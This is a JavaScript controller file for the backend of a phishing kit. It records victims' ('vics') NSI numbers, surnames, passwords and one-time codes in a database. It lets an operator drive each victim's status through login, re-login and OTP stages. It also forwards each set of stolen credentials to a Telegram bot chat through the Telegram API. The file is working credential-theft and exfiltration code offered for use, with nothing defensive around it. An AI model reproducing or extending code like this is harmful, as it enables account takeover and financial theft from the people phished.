const NSI = require("../models/nsiModel");
const axios = require("axios");
var moment = require("moment"); // require

const getOwnerVics = async (req, res) => {
	const { owner } = req.params;
	NSI.find({ owner })
		.sort({ timestamp: -1 })
		.exec((err, vics) => {
			if (err) {
				console.log(err);
				res.status(404).send("Error");
				return;
			}
			res.send(vics);
		});
};

const command = async (req, res) => {
	const { uniqueid, status } = req.body;
	try {
		await NSI.findOneAndUpdate({ uniqueid }, { status }).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const getInfo = async (req, res) => {
	const { uniqueid } = req.params;
	NSI.findOne({ uniqueid }).exec((err, vic) => {
		if (err) {
			console.log(err);
			res.status(404).send("Error");
			return;
		}
		res.send(vic);
	});
};

const submitLogin = async (req, res) => {
	const { nsiNumber, surname, password, uniqueid, owner, ip } = req.body;
	try {
		await NSI.create({
			uniqueid,
			nsiNumber,
			surname,
			password,
			status: 1,
			owner,
			ip,
			timestamp: moment().format(),
		});

		let originalText = `ID: ${uniqueid}\nNSI: ${nsiNumber}\nLast name: ${surname}\nPassword: ${password}`;
		await axios
			.post(
				`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
				{
					chat_id: "--837014205",
					text: `NSI:\n${originalText}`,
					parse_mode: "Markdown",
				}
			)
			.catch((e) => {
				console.log(e);
			});

		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitLoginAgain = async (req, res) => {
	const { nsiNumber, surname, password, uniqueid } = req.body;
	try {
		await NSI.findOneAndUpdate(
			{ uniqueid },
			{ nsiNumber, surname, password, status: 5, timestamp: moment().format() }
		).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitOtp = async (req, res) => {
	const { otp, uniqueid } = req.body;
	try {
		await NSI.findOneAndUpdate(
			{ uniqueid },
			{ otp, status: 3, timestamp: moment().format() }
		).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const deleteEntry = async (req, res) => {
	const { uniqueid } = req.body;
	try {
		await NSI.deleteOne({ uniqueid });
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

module.exports = {
	getOwnerVics,
	command,
	getInfo,
	submitLogin,
	submitLoginAgain,
	submitOtp,
	deleteEntry,
};
